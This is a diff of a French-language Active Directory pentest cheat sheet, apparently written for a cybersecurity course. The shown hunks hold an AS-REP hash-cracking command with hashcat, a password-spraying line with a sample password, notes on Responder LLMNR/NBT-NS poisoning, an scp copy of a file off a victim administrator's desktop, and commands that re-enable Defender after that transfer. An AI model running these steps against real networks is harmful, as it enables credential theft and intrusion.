@@ -180,8 +180,9 @@ printf '%s\n' '$krb5asrep$23$COLETTE_MCKEE@TSSR-CYBER.FR:<hash>' > COLETTEHASH.t
 ## __OFFLINE CRAKING__
 
 
-Après avoir avoir récupéré un hash, créer un fichier (ici asrep.hash) qui contient le hash AS-REP obtenu avec impacket : `$krb5asrep$23$KATRINA_RUTLEDGE@CYBER-MANAGEMENT.FR:<hash>`, il est possible de le craker avec hashcat ou JhonTheRipper
+Après avoir avoir récupéré un hash, créer un fichier (ici asrep.hash) qui contient le hash AS-REP obtenu avec impacket : `$krb5asrep$23$KATRINA_RUTLEDGE@CYBER-MANAGEMENT.FR:<hash>`.
 
+Il est possible de le craker avec hashcat ou JhonTheRipper.
 ```sh
 sudo hashcat -m 18200 -a 0 asrep.hash /usr/share/wordlists/rockyou.txt
 ```
@@ -311,6 +312,10 @@ sprayhound -d TSSR-CYBER.FR -dc 10.0.0.1 -lu a.leration -lp 'Tssrcyber1234' -p '
 
 __Responder__
 
+> T1557.001 – LLMNR/NBT-NS Poisoning
+
+`Link-Local Multicast Name Resolution` (LLMNR) et `NetBIOS Name Service` (NBT-NS) sont des composants Microsoft Windows qui servent de méthodes alternatives d'identification d'hôte.
+
 * Responder usurpe des services via MDNS / LLMNR / NBT-NS  / WPAD 
 * NTLM peut être amené à utiliser ces protocoles, Responder peut donc les intercepter.
 * Il vient se placer entre le client et le “serveur” inexistant (qu'il imite)
@@ -360,7 +365,7 @@ __Chemin des logs Responder :__
 
 
 
-## __Se conencter via WinRM sur la machine victime__
+## __Se connecter via WinRM sur la machine victime__
 
 ### L'utilisateur doit être dans le groupe admin du domaine
 ```sh
@@ -472,8 +477,18 @@ scp -P 1111 administrateur@10.0.0.1:/C:/Users/Administrateur/Desktop/20260108151
 ```
 
 ### Réactiver Defender après avoir transféré le fichier
-```powershell
-Set-MpPreference -DisableRealtimeMonitoring $false -DisableIntrusionPreventionSystem $false -DisableIOAVProtection $false -DisableScriptScanning $false -EnableControlledFolderAccess Enabled -EnableNetworkProtection Enabled
+```shell
+Set-MpPreference `
+  -DisableRealtimeMonitoring $false `
+  -DisableBehaviorMonitoring $false `
+  -DisableIntrusionPreventionSystem $false `
+  -DisableIOAVProtection $false `
+  -DisableScriptScanning $false `
+  -DisablePrivacyMode $false `
+  -DisableBlockAtFirstSeen $false
+
+Remove-MpPreference -ExclusionExtension "ps1","exe"
+Remove-MpPreference -ExclusionPath "C:\Windows\Temp"
 ```
 
 
